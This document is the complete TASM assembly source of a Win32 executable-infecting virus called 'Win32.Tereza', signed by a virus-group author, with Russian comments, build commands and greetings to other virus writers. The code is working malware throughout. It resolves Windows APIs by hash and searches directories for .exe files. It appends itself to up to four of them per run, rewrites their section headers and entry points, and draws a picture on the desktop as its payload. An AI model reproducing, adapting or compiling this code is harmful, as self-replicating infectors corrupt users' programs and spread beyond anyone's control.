;        tttt     pppppp      ooo        ccc
;      tttttttt   pp   pp   ooo ooo    ccc ccc
;      tttttttt   pp    pp ooo   ooo  ccc    cc
;      tttttttt   pp    pp ooo   ooo  ccc
;        tttt     pp   pp  ooo   ooo  ccc
;        tttt     pppppp   ooo   ooo  ccc
;        tttt     pp       ooo   ooo  ccc    cc
;        tttt t   pp        ooo ooo    ccc ccc
;         tttt    pp          ooo        ccc	
;-------win32.tereza-----by---FreeMan[tpoc]----------
;(с) 2005
;------------
;это мой второй РЕ инфектор. он не блещет новыми фичами. 
;заражает РЕ-ЕХЕ файлы. бегает по директориям. присутствует полезная нагрузка
;-----------
;-заражает по 4 файла
;-использует хеши (если это можно так назвать) вместо имён апишек
;-компилится ТАСМом
;-умеет передвигатся по папкам (getdir)
;-учитывает наличие оверлея (существует вероятность, что размер файла не 
;увеличится
;-----------
;Полезная нагрузка
;В верхнем левом углу экрана появляется собачка :) Рисование средствами gdi32
;-----------
;Почему "Тереза"? Мою собаку звали так. Она недавно покинула этот мир :(
;--------------
;Благодарности etc.
;Bill[tpoc] - за то, что постоянно напоминал мне о вире. чаще заходи в инет.
;LiS - моральная поддержка. жду твоего зверька со сканом отпечатков :)
;[tpoc] - мы ещё только начинаем. не сдавайтесь и мы будем силой.
;группам Disturbed, Koяn, Slipknot, Ленинград, Sum41, Hate ... - за муз. сопровождение
;всем VXерам.
;--------------
;Автор не несёт ответственности за представленный исходный код. Компилируйте его на свой страх и риск
;Tasm32.exe /m3 /ml /zi tereza.asm , , ;
;Tlink32.exe /Tpe /aa tereza, tereza, ,import32.lib,,
;if exist tereza.map del tereza.map
;if exist tereza.obj del tereza.obj
;if exist tereza.lst del tereza.lst
;pewrsec tereza.exe

includelib import32.lib
extrn ExitProcess: near
extrn MessageBoxA: near
.386        
.model	flat
jumps
.data                                                     
szmess db "Zaraza ok",0
.code
start:
pusha
call delta                         
some_msg db "[WIN32.TEREZA] virus by FreeMan[tpoc]",0ah,0dh,"Tereza was my dog. 19.05.1996-15.04.2005",0
delta:                             
sub dword ptr [esp], offset some_msg
xor  edx,edx

mov ebp,[esp]
add esp,4

call GetKern
jnz Exit

lea edi,[ebp+offset GetSystemDirectoryA_]
call ZapolniTable

sub esp,400
mov [ebp+stack_dir],esp
mov ebx,esp

push ebx
push Some_pathes
call [ebp+GetCurrentDirectoryA]

add ebx,200
push ebx
push Some_pathes
call ebp+[GetCurrentDirectoryA]

mov byte ptr [ebp+bcount],0
povt:
call infect4
cmp byte ptr [ebp+bcount],4
je vixod

call getdir
jnc povt

vixod:
test ebp,ebp
je first_gen
call not_first_gen


;ЪДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДї
;і NEED:                         і
;і nifiga                        і
;і RESULT:                       і
;і infected <=4 files            і
;АДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДЩ
infect4 proc

lea eax,[ebp+offset WFD32]
push eax
lea ebx,[ebp+offset FN4Search]
push ebx
call [ebp+FindFirstFileA]
inc eax
jz exitsss
dec eax
mov [ebp+offset hFF],eax

go_go_go:
lea eax,[ebp+FName]
call infect_file

cmp byte ptr [ebp+bcount],4
je exitsss

lea eax,[ebp+offset WFD32]
push eax
push dword ptr [ebp+offset hFF]
call [ebp+FindNextFileA]
test eax,eax
jnz go_go_go

exitsss:
push dword ptr [ebp+offset hFF]
call [ebp+FindClose]
ret
infect4 endp


not_first_gen proc
add esp,4
lea ebx,[ebp+lib_user32]
call GetUser
lea edi,[ebp+user32]
call ZapolniTable
lea ebx,[ebp+lib_gdi32]
call GetUser
lea edi,[ebp+gdi32]
call ZapolniTable

call paint

call dir_na_mesto
popa
mov [esp-4],eax
mov eax,0DEADDEADh
org $-4
EIP dd 0
mov [esp],eax
mov eax,[esp-4]
ret
not_first_gen endp

;ЪДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДї
;і NEED:                         і
;і eax=offset of file name str   і
;і RESULT:                       і
;і infected     file             і
;АДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДЩ
infect_file proc
push eax
push 00000080h
push eax
call [ebp+SetFileAttributesA]
pop eax
call create_file
jc fallen1
nexxxxt:
mov dword ptr [ebp+hFO],eax

mov ecx,dword ptr [ebp+FSizeL]
call createfm
jnc nexxxxt1
mov eax, dword ptr [ebp+hFO]
call close_obj
jmp fallen1

nexxxxt1:
mov [ebp+hFM],eax

call mapfile
jnc nexxt23
mov eax, [ebp+hFM]
call close_obj
mov eax, [ebp+hFO]
call close_obj
jmp fallen1

nexxt23:
mov [ebp+pFM],eax
call check_good
jnc next234

negood:
push [ebp+pFM]
call [ebp+UnmapViewOfFile]
mov eax, [ebp+hFM]
call close_obj
mov eax, [ebp+hFO]
call close_obj
jmp fallen1

next234:
mov ecx,dword ptr [eax+3ch]
mov [ebp+dAFactor], ecx
mov ecx,dword ptr [eax+38h]
mov [ebp+dAsFactor], ecx

movzx ecx,word ptr [eax+6]
call findlastsec
jc negood
push edi
mov [ebp+sub_eax_xxx],0

allok:
add edx,dword ptr [esi+10h]
mov edi,edx
sub edx,dword ptr [ebp+FSizeL]
jz dal66e
neg edx
xchg edx,ecx
push ecx
push eax
add edi,[ebp+pFM]
xor eax,eax
repe scasb
pop eax
pop ecx
pop edi
jne negood
push edi
cmp ecx, vsize
mov [ebp+sub_eax_xxx],ecx
ja gryaznoe_delo

dal66e:
push [ebp+pFM]
call [ebp+UnmapViewOfFile]
mov eax, [ebp+hFM]
call close_obj

mov eax,vsize

sub eax,12345678h
org $-4
sub_eax_xxx dd 00000000h

mov ecx,[ebp+dAFactor]
call align_this

;equotes
vsize equ (endvirus-start)
;--------------


add eax,dword ptr [ebp+FSizeL]
xchg eax,ecx
mov eax,[ebp+hFO]
call createfm

mov [ebp+hFM],eax
call mapfile
mov [ebp+pFM],eax

add eax,[eax+3ch]

gryaznoe_delo:
mov edi,[esp]
mov ecx,[edi+10h]
add ecx,12345678h
org $-4
phys_ofs dd 0

mov edi,[ebp+pFM]
add edi,ecx

push [ebp+EIP]
mov edx, dword ptr [eax+28h]
add edx, dword ptr [eax+34h]
mov dword ptr [ebp+EIP],edx

push eax
mov ecx,vsize
lea esi,[ebp+offset start]
rep movsb
pop eax
pop [ebp+EIP]

pop edi
add ebx,[edi+10h]
mov dword ptr [eax+28h],ebx

push eax
mov eax,vsize
push eax
mov ecx,[ebp+dAsFactor]
add eax,dword ptr [edi+8]
call align_this
mov dword ptr [edi+8],eax
pop eax
mov ecx,[ebp+dAFactor]
add eax,dword ptr [edi+10h]
call align_this
mov dword ptr [edi+10h],eax

pop eax
mov ecx,dword ptr [edi+0ch]
add ecx,dword ptr [edi+8]

mov dword ptr [eax+50h],ecx
mov dword ptr [eax+44],'1504'

push [ebp+pFM]
call [ebp+UnmapViewOfFile]
mov eax, [ebp+hFM]
call close_obj
mov eax, [ebp+hFO]
call close_obj
jmp ok

fallen1:
dec byte ptr [ebp+bcount]
ok:
inc byte ptr [ebp+bcount]
ret
infect_file endp

;ЪДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДї
;і NEED:                         і
;і eax=pe header va              і
;і ecx=number of obj             і
;і RESULT:                       і
;і edi=va of last sec            і
;і ebx=virtual_offset            і
;і edx=physical offset           і
;АДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДЩ
findlastsec proc
push eax
movzx edi, word ptr [eax+14h]
lea eax,[eax+edi+18h]
mov edx,[eax+14h]
mov ebx,[eax+0ch]
scoffs:
mov [eax+24h],0A0000020h
cmp edx,[eax+14h]
ja shvrva
mov edx,[eax+14h]
mov esi,eax

shvrva:
cmp ebx,[eax+0ch]
ja nextobj
mov ebx,[eax+0ch]
mov edi,eax

nextobj:
add eax,28h
loop scoffs
cmp esi,edi
stc
jne ex12
clc
ex12:
mov [ebp+phys_ofs],edx

pop eax
ret
findlastsec endp

;ЪДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДї
;і NEED:                         і
;і ecx=alignment factor          і
;і eax=dword to align            і
;і RESULT:                       і
;і eax=aligned dword             і
;АДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДЩ
align_this proc
dec ecx
add eax,ecx
not ecx
and eax,ecx
ret
align_this endp

;ЪДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДї
;і NEED:                         і
;і eax=address of file           і
;і RESULT:                       і
;і cf=0  if good                 і
;і eax=offset of pe header       і
;АДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДЩ
check_good proc
cmp word ptr [eax],'ZM'
jne exitts1234
add eax,[eax+3ch]
cmp word ptr [eax],'EP'
jne exitts1234
cmp dword ptr [eax+44],'1504'
je exitts1234

clc
jmp ok_ok_ok
exitts1234:
stc
ok_ok_ok:
ret
check_good endp

;ЪДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДї
;і NEED:                         і
;і eax=object handle             і
;і RESULT:                       і
;і closed                        і
;АДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДЩ
close_obj proc
push eax
call [ebp+CloseHandle]	
	ret
close_obj endp

;ЪДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДї
;і NEED:                         і
;і in szcurrdir - dir            і
;і RESULT:                       і
;і in szcurrdir - new dir        і
;АДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДЩ
getdir proc
mov edi,[ebp+stack_dir]
inc byte ptr [ebp+bdirs]
xor eax,eax
povtor12:
scasb
jne povtor12

iskat_sla6:
dec edi
cmp byte ptr [edi],"\"
jne iskat_sla6

kill_sla6:
inc edi
mov byte ptr [edi],0
xchg ebx,edi
mov eax,[ebp+stack_dir] 
push eax
call [ebp+SetCurrentDirectoryA]
mov byte ptr [ebx-1],0
cmp byte ptr [ebx-2],":"
stc
je exit_nax

clc
exit_nax:
ret
bdirs db 0
stack_dir dd 0
getdir endp

dir_na_mesto proc
mov edi,[ebp+stack_dir]
add edi,200
push edi
call [ebp+SetCurrentDirectoryA]
mov eax,[esp]
add esp,204
jmp eax
dir_na_mesto endp

;ЪДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДї
;і NEED:                         і
;і eax=handle left by createfm   і
;і RESULT:                       і
;і cf=0  if good                 і
;і eax=offset of file mapping    і
;АДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДЩ
mapfile proc
xor edx,edx
push edx                             ;number bytes to map
push edx                             ;offs low
push edx                             ;offs high
push SecRW                             ;access mode

;eqoutes
SECTION_MAP_WRITE equ 2h
SECTION_MAP_READ equ 4h
SecRW equ SECTION_MAP_WRITE or SECTION_MAP_READ
;---------

push eax                             ;handle by crFM
call [ebp+MapViewOfFile]
stc
test eax,eax
jz exits1234
	
clc
exits1234:
ret
mapfile endp

;ЪДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДї
;і NEED:                         і
;і eax=file   handle             і
;і ecx=file   size               і
;і RESULT:                       і
;і mapping created               і
;АДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДЩ
createfm proc
xor edx,edx
push edx                             ;name of object
push ecx                             ;low size
push edx                             ;high size

;eqoutes
PAGE_READWRITE equ 00000004h
;-----------

push PAGE_READWRITE                  ;protect
push edx                             ;security attr
push eax                             ;handle to file to map
call [ebp+CreateFileMappingA]
stc
test eax,eax
jz exits123

clc
exits123:	
ret
createfm endp

;ЪДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДї
;і NEED:                         і
;і eax=offset of file name str   і
;і RESULT:                       і
;і eax=handle of file            і
;і cf=0 if success               і
;АДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДЩ
create_file proc
xor edx,edx
push edx
push edx
push 00000003h                       ;how to create(OPEN_EXISTING)
push edx
push 00000003h                       ;share mode (FILE_SHARE_READ + FILE_SHARE_WRITE)
push 0c0000000h                      ;access mode (GENERIC_READ + GENERIC_WRITE)
push eax                             ;pointer to file name
call [ebp+CreateFileA]
stc
inc eax
jz exits
dec eax
clc

exits:
ret
create_file endp

MAX_PATH equ 100h
Some_pathes equ 200

kernel32:
GetSystemDirectoryA_     dd 67b38100h
GetSystemDirectoryA      dd 0
GetCurrentDirectoryA_    dd 98cf9200h
GetCurrentDirectoryA     dd 0
SetCurrentDirectoryA_    dd 98db9200h
SetCurrentDirectoryA     dd 0
CreateFileA_             dd 904f3600h
CreateFileA              dd 0
FindFirstFileA_          dd 0ccc7b700h
FindFirstFileA           dd 0
FindNextFileA_           dd 0cc7e9700h 
FindNextFileA            dd 0
CreateFileMappingA_      dd 41732d00h
CreateFileMappingA       dd 0
MapViewOfFile_           dd 0c5a78200h
MapViewOfFile            dd 0
UnmapViewOfFile_         dd 0e515d700h
UnmapViewOfFile          dd 0
SetFilePointer_          dd 0feccc300h 
SetFilePointer           dd 0
SetFileAttributesA_      dd 72693900h
SetFileAttributesA       dd 0
FindClose_               dd 3f1f1900h
FindClose                dd 0
CloseHandle_		 	 dd 0A4831b00h
CloseHandle		 	  	 dd 0
LoadLibraryA_			 dd 6ca68400h
LoadLibraryA			 dd 0
lstrcatA_				 dd 1752d500h
lstrcatA				 dd 0
my_name_is dw 0B0BAH

user32:
GetWindowDC_             dd 80465900h
GetWindowDC				 dd 0
GetDesktopWindow_		 dd 4b2ef900h
GetDesktopWindow 		 dd 0
_my_name_is dw 0B0BAH

gdi32:
SelectObject_            dd 0be8d6c00h
SelectObject			 dd 0
CreatePen_ 				 dd 384bf400h
CreatePen				 dd 0
Ellipse_				 dd 13dfdc00h
Ellipse					 dd 0
RoundRect_				 dd 3b362500h
RoundRect				 dd 0
LineTo_					 dd 0ddbdb100h
LineTo					 dd 0
MoveToEx_				 dd 3bf7e500h
MoveToEx				 dd 0
__my_name_is dw 0B0BAH

FN4Search db "*.exe",0
bcount db 0
hFF dd 0
hFO dd 0
hFM dd 0
pFM dd 0
dAFactor dd 0
dAsFactor dd 0
lib_user32 db "\user32.dll",0
lib_gdi32 db "\gdi32.dll",0

WFD32:
FAttr          dd 0
FCrTime        dd 0,0
FLAcsTime      dd 0,0
FLWTime        dd 0,0
FSizeH         dd 0
FSizeL         dd 0
FRes           dd 0,0
FName          db MAX_PATH dup (0)
AFName         db 13 dup (?)
;317bytes total

;ЪДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДї
;і NEED:                         і
;і edx=0                         і
;і RETURN:                       і
;і in eax - kernel imagebase     і
;і in edx - rva of pe            і
;і zf=1 if success               і
;АДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДЩ
GetKern proc
mov  eax,fs:[edx]
dec  edx

search32:                          
cmp [eax],edx                     
je check32                         
mov  eax,[eax]                     
jmp short search32                       

check32:                           
mov  eax,[eax+4]                   
xor ax,ax                          
searchMZ:                          
cmp word ptr [eax],5A4Dh;MZ           
je IsPe                            
sub eax,10000h                     
jmp short searchMZ                       

IsPe:	           
mov edx,[eax+3ch]  
cmp word ptr [eax+edx],4550h;PE
ret
GetKern endp

;ЪДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДї
;і NEED:                         і
;і ebx=offsettolibname           і
;і loadlibrary                   і
;і RETURN:                       і
;і in eax - user32 imagebase     і
;і in edx - rva of pe            і
;АДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДЩ
GetUser proc
lea eax,[ebp+szpath]
push eax
push ebx
push eax
push sizes

;equotes
sizes equ 30
;----------------

push eax
call [ebp+GetSystemDirectoryA]

call [ebp+lstrcatA]

call [ebp+LoadLibraryA]

mov edx,[eax+3ch]

ret
GetUser endp

szpath db 45 dup (0)


;ЪДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДї
;і NEED:                         і
;і edi=begin table               і
;і in eax - user32 imagebase     і
;і in edx - rva of pe            і
;і RETURN:                       і
;і gpf or all ok                 і
;АДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДЩ
ZapolniTable proc
mov esi, [eax+edx+78h]

lea esi,[esi+eax+1ch]                        

xchg eax,ebx                       
mov ecx,3

loop_lodsd:
lodsd
add eax,ebx
push eax
dec cl
jnz loop_lodsd


main_loop:
mov esi,[esp+4]
xor edx,edx

searchAPI:
push esi 

mov esi,[esi]
add esi,ebx
;esi= адрес строки с именем функции
call GetShifr
cmp eax,[edi]
pop esi
jz equal

inc edx
;счетчик

add esi,4
;к следующему оффсету
jmp searchAPI

equal:    
shl edx,1

mov ecx,[esp]
add ecx,edx
mov ecx,[ecx]
and ecx,0ffffh
shl ecx,2

mov eax,[esp+4*2]
add eax,ecx
mov eax,[eax]
add eax,ebx

add edi,4
mov [edi],eax
cmp word ptr [edi+4],0B0BAH
je vse_naideno

add edi,4
jmp main_loop

vse_naideno:
add esp,4*3
	
ret
ZapolniTable endp

;ЪДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДї
;і NEED:                          і
;і nothing                        і
;і RETURN:                        і
;і picture on screen              і
;АДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДЩ
paint proc
call [ebp+GetDesktopWindow]
push eax
call [ebp+GetWindowDC]
xchg eax,ebx

push 00415f88h
push 3
push 0
call [ebp+CreatePen]

push eax
push ebx
call [ebp+SelectObject]

push 54
push 34
push ebx
call [ebp+LineTo]

push 40
push 20
push 100
push 120
push 50
push 30
push ebx
call [ebp+RoundRect]

push 20
push 20
push 60
push 150
push 10
push 110
push ebx
call [ebp+RoundRect]

push 20
push 20
push 45
push 135
push 10
push 111
push ebx
call [ebp+RoundRect]

push 20
push 20
push 50
push 175
push 30
push 139
push ebx
call [ebp+RoundRect]

push 34
push 179
push 26
push 171
push ebx
call [ebp+Ellipse]	

push 28
push 147
push 20
push 139
push ebx
call [ebp+Ellipse]	
	
push 0
push 100
push 50
push ebx
call[ebp+MoveToEx]

push 130
push 50
push ebx
call [ebp+LineTo]

push 0
push 100
push 95
push ebx
call[ebp+MoveToEx]

push 130
push 95
push ebx
call [ebp+LineTo]

	
ret
paint endp


;ЪДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДї
;і NEED:                          і
;і esi=StrZ offset                і
;і RETURN:                        і
;і in eax - Shifr ot stroki texta і
;АДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДДЩ
GetShifr proc
xor eax,eax
laaa:
lodsb
test al,al
jz konec_str
add al,ah
ror eax,8
jmp laaa

konec_str:
ret
GetShifr endp

endvirus:
first_gen:
push 0
push offset szmess
push offset szmess
push 0
call MessageBoxA

Exit:
push 0
call  ExitProcess
end	start
